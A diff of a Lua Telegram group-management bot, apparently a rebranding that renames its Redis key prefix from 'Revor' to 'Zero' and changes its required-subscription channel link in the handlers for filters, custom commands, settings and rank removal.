 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙لا يوجد كلمات ممنوعه هنا *","md",true)   
 end  
@@ -7135,8 +7138,8 @@ v = v:gsub('photo:',"")
 v = v:gsub('sticker:',"") 
 v = v:gsub('animation:',"") 
 v = v:gsub('text:',"") 
-Redis:del(Revor.."Revor:Filter:Group:"..v..msg_chat_id)  
-Redis:srem(Revor.."Revor:List:Filter"..msg_chat_id,v)  
+Redis:del(Zero .."Zero :Filter:Group:"..v..msg_chat_id)  
+Redis:srem(Zero .."Zero :List:Filter"..msg_chat_id,v)  
 end  
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح ("..#list..") كلمات ممنوعه *","md",true)   
 end
@@ -7145,10 +7148,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Filter"..msg_chat_id)  
+local list = Redis:smembers(Zero .."Zero :List:Filter"..msg_chat_id)  
 if #list == 0 then  
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙لا يوجد كلمات ممنوعه هنا *","md",true)   
 end  
@@ -7168,7 +7171,7 @@ v = v:gsub('photo:',"")
 v = v:gsub('sticker:',"") 
 v = v:gsub('animation:',"") 
 v = v:gsub('text:',"") 
-local Text_Filter = Redis:get(Revor.."Revor:Filter:Group:"..v..msg_chat_id)   
+local Text_Filter = Redis:get(Zero .."Zero :Filter:Group:"..v..msg_chat_id)   
 Filter = Filter.."*"..k.."- "..ver.." » { "..Text_Filter.." }*\n"    
 end  
 LuaTele.sendText(msg_chat_id,msg_id,Filter,"md",true)  
@@ -7178,10 +7181,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id,'true')
+Redis:set(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id,'true')
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙ارسل الان { ملصق ,متحركه ,صوره ,رساله } *',"md",true)  
 end    
 if text == "الغاء منع" then    
@@ -7189,10 +7192,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id,'DelFilter')
+Redis:set(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id,'DelFilter')
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙ارسل الان { ملصق ,متحركه ,صوره ,رساله } *',"md",true)  
 end
 
@@ -7201,10 +7204,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
+Redis:set(Zero .."Zero :All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙الان ارسل لي الامر القديم ...","md",true)
 end
 if text == "حذف امر عام" or text == "مسح امر عام" then 
@@ -7212,10 +7215,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
+Redis:set(Zero .."Zero :All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الامر الذي قمت بوضعه مكان الامر القديم","md",true)
 end
 if text == "حذف الاوامر المضافه العامه" or text == "مسح الاوامر المضافه العامه" then 
@@ -7223,13 +7226,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:All:Command:List:Group")
+local list = Redis:smembers(Zero .."Zero :All:Command:List:Group")
 for k,v in pairs(list) do
-Redis:del(Revor.."Revor:All:Get:Reides:Commands:Group"..v)
-Redis:del(Revor.."Revor:All:Command:List:Group")
+Redis:del(Zero .."Zero :All:Get:Reides:Commands:Group"..v)
+Redis:del(Zero .."Zero :All:Command:List:Group")
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم مسح جميع الاوامر التي تم اضافتها في العام","md",true)
 end
@@ -7238,13 +7241,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:All:Command:List:Group")
+local list = Redis:smembers(Zero .."Zero :All:Command:List:Group")
 Command = "⌔︙قائمه الاوامر المضافه العامه  \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
 for k,v in pairs(list) do
-Commands = Redis:get(Revor.."Revor:All:Get:Reides:Commands:Group"..v)
+Commands = Redis:get(Zero .."Zero :All:Get:Reides:Commands:Group"..v)
 if Commands then 
 Command = Command..""..k..": ("..v..") ← {"..Commands.."}\n"
 else
@@ -7263,10 +7266,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
+Redis:set(Zero .."Zero :Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙الان ارسل لي الامر القديم ...","md",true)
 end
 if text == "حذف امر" or text == "مسح امر" then 
@@ -7274,10 +7277,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
+Redis:set(Zero .."Zero :Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الامر الذي قمت بوضعه مكان الامر القديم","md",true)
 end
 if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" then 
@@ -7285,13 +7288,13 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:Command:List:Group"..msg_chat_id)
+local list = Redis:smembers(Zero .."Zero :Command:List:Group"..msg_chat_id)
 for k,v in pairs(list) do
-Redis:del(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..v)
-Redis:del(Revor.."Revor:Command:List:Group"..msg_chat_id)
+Redis:del(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..v)
+Redis:del(Zero .."Zero :Command:List:Group"..msg_chat_id)
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم مسح جميع الاوامر التي تم اضافتها","md",true)
 end
@@ -7300,13 +7303,13 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:Command:List:Group"..msg_chat_id.."")
+local list = Redis:smembers(Zero .."Zero :Command:List:Group"..msg_chat_id.."")
 Command = "⌔︙قائمه الاوامر المضافه  \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
 for k,v in pairs(list) do
-Commands = Redis:get(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..v)
+Commands = Redis:get(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..v)
 if Commands then 
 Command = Command..""..k..": ("..v..") ← {"..Commands.."}\n"
 else
@@ -7324,7 +7327,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7342,7 +7345,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7359,7 +7362,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7376,7 +7379,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -7424,40 +7427,40 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:get(Revor.."Revor:Status:Link"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Link"..msg.chat_id) then
 Statuslink = '❬ ✔️ ❭' else Statuslink = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:Welcome"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Welcome"..msg.chat_id) then
 StatusWelcome = '❬ ✔️ ❭' else StatusWelcome = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:Id"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Id"..msg.chat_id) then
 StatusId = '❬ ✔️ ❭' else StatusId = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:IdPhoto"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:IdPhoto"..msg.chat_id) then
 StatusIdPhoto = '❬ ✔️ ❭' else StatusIdPhoto = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:Reply"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Reply"..msg.chat_id) then
 StatusReply = '❬ ✔️ ❭' else StatusReply = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:ReplySudo"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:ReplySudo"..msg.chat_id) then
 StatusReplySudo = '❬ ✔️ ❭' else StatusReplySudo = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:BanId"..msg.chat_id)  then
+if Redis:get(Zero .."Zero :Status:BanId"..msg.chat_id)  then
 StatusBanId = '❬ ✔️ ❭' else StatusBanId = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:SetId"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:SetId"..msg.chat_id) then
 StatusSetId = '❬ ✔️ ❭' else StatusSetId = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 StatusGames = '❬ ✔️ ❭' else StatusGames = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:KickMe"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:KickMe"..msg.chat_id) then
 Statuskickme = '❬ ✔️ ❭' else Statuskickme = '❬ ❌ ❭'
 end
-if Redis:get(Revor.."Revor:Status:AddMe"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:AddMe"..msg.chat_id) then
 StatusAddme = '❬ ✔️ ❭' else StatusAddme = '❬ ❌ ❭'
 end
 local protectionGroup = '\n*⌔︙اعدادات حمايه المجموعه\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
@@ -7475,7 +7478,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -7486,7 +7489,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Text = "*\n⌔︙اعدادات المجموعه ".."\n🔏︙علامة ال (✔️) تعني مقفول".."\n🔓︙علامة ال (❌) تعني مفتوح*"
@@ -7546,7 +7549,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7587,7 +7590,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7657,7 +7660,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -7668,32 +7671,32 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-if Redis:sismember(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id) then
 dev = "المطور ،" else dev = "" end
-if Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id) then
 crr = "منشئ اساسي ،" else crr = "" end
-if Redis:sismember(Revor..'Revor:Originators:Group'..msg_chat_id, Message_Reply.sender.user_id) then
+if Redis:sismember(Zero ..'Zero :Originators:Group'..msg_chat_id, Message_Reply.sender.user_id) then
 cr = "منشئ ،" else cr = "" end
-if Redis:sismember(Revor..'Revor:Managers:Group'..msg_chat_id, Message_Reply.sender.user_id) then
+if Redis:sismember(Zero ..'Zero :Managers:Group'..msg_chat_id, Message_Reply.sender.user_id) then
 own = "مدير ،" else own = "" end
-if Redis:sismember(Revor..'Revor:Addictive:Group'..msg_chat_id, Message_Reply.sender.user_id) then
+if Redis:sismember(Zero ..'Zero :Addictive:Group'..msg_chat_id, Message_Reply.sender.user_id) then
 mod = "ادمن ،" else mod = "" end
-if Redis:sismember(Revor..'Revor:Distinguished:Group'..msg_chat_id, Message_Reply.sender.user_id) then
+if Redis:sismember(Zero ..'Zero :Distinguished:Group'..msg_chat_id, Message_Reply.sender.user_id) then
 vip = "مميز ،" else vip = ""
 end
 if The_ControllerAll(Message_Reply.sender.user_id) == true then
 Rink = 1
-elseif Redis:sismember(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id)  then
+elseif Redis:sismember(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id)  then
 Rink = 2
-elseif Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id) then
 Rink = 3
-elseif Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id, Message_Reply.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id, Message_Reply.sender.user_id) then
 Rink = 4
-elseif Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id, Message_Reply.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id, Message_Reply.sender.user_id) then
 Rink = 5
-elseif Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id) then
 Rink = 6
-elseif Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id) then
 Rink = 7
 else
 Rink = 8
@@ -7705,47 +7708,47 @@ if msg.ControllerBot then
 if Rink == 1 or Rink < 1 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
 elseif msg.Developers then
 if Rink == 2 or Rink < 2 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
 elseif msg.TheBasics then
 if Rink == 3 or Rink < 3 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
 elseif msg.Originators then
 if Rink == 4 or Rink < 4 then
